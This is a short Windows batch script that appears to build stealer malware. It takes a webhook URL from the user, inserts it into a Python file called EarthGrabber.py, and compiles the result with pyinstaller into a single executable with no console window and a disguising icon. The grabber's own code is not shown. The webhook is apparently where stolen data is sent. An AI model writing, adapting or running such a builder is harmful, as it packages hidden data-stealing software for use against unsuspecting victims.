@echo off

set /p webhook_url=Enter the webhook URL: 
REM Set the webhook URL in Python code
set python_code=EarthGrabber.py
set output_file=BuildV2.py

REM Replace the placeholder with the webhook URL in the Python code
powershell -Command "(Get-Content %python_code%) -replace 'YOUR URL HERE', '%webhook_url%' | Out-File %output_file% -Encoding utf8"

echo Webhook URL replaced successfully in %output_file%

REM Wait for 5 seconds

timeout /t 2

REM Build the executable using pyinstaller
echo Building exe...
echo.
pyinstaller --onefile --noconsole --icon=Default.ico %output_file%


pause
